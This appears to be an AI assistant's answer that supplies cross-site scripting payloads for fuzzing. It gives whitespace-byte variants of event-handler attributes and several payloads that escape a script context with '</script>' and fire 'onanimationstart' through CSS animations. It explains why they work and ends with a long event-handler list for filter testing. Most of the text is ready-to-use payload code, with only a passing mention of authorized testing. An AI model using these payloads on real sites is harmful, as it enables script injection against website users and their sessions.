`<svg onload=alert(1)>`
Here are the lists formatted in standard copy-to-clipboard blocks for your fuzzing tools.
## URL-Encoded Format
```
%09
%0a
%0c
%0d
%20
```
## Full Payload Format
```
onload%09=
onload%0a=
onload%0c=
onload%0d=
onload%20=
```
## Hex/Byte Format (for Intruder/Fuzzers)
```
0x09
0x0A
0x0C
0x0D
0x20
```
Would you like help setting these up inside a specific fuzzing tool like Burp Suite or OWASP ZAP, or would you like a Python automation script to test them?





Commonly useful for XSS:

```html
onload
onerror
onbegin
onfocus
ontoggle
onclick
onmouseover
onanimationstart
ontransitionend
```

Try these variants for your authorized security testing for `onanimationstart`:

```html
</script><style>@keyframes x{}</style><x style="animation-name:x" onanimationstart=alert(1)>
```

```html
</script><x style="display:block;animation-name:x;animation-duration:1s" onanimationstart=alert(1)>
<style>@keyframes x{from{opacity:0}to{opacity:1}}</style>
```

```html
</script><style>@keyframes a{}</style><div style="animation:a 1s" onanimationstart=alert(1)>
```

```html
</script><style>@keyframes a{}</style><svg style="animation:a 1s" onanimationstart=alert(1)>
```

Why these work:

* `</script>` escapes the script context
* CSS animation starts automatically
* `onanimationstart` fires when animation begins

If CSP blocks inline handlers entirely, these may still fail even though parser breakout succeeds.

LESS useful because it requires user interaction.
```html
onload
onerror
onbegin
onfocus
onfocusin
onanimationstart
onanimationend
ontransitionend
ontoggle
onclick
onmouseover
onmouseenter
onpointerenter
onpointerover
onwheel
onauxclick
onmouseup
onmousedown
onmousemove
onmouseleave
onmouseout
oncontextmenu
ondblclick
onpointerdown
onpointerup
onpointermove
onpointerrawupdate
onpointercancel
onratechange
onresize
onscroll
onseeked
onseeking
onstalled
onsubmit
onsuspend
ontimeupdate
onvolumechange
onwaiting
onplay
onplaying
onpause
oncanplay
oncanplaythrough
ondurationchange
onemptied
onended
onloadeddata
onloadedmetadata
onloadstart
onprogress
onabort
onafterprint
onbeforeprint
onbeforeunload
onhashchange
onlanguagechange
onmessage
onoffline
ononline
onpagehide
onpageshow
onpopstate
onstorage
onunload
oninvalid
oninput
onchange
onreset
onselect
onselectionchange
onkeypress
onkeydown
onkeyup
ondrag
ondragstart
ondragend
ondragenter
ondragleave
ondragover
ondrop
oncopy
oncut
onpaste
onblur
onclose
oncancel
oncuechange
```


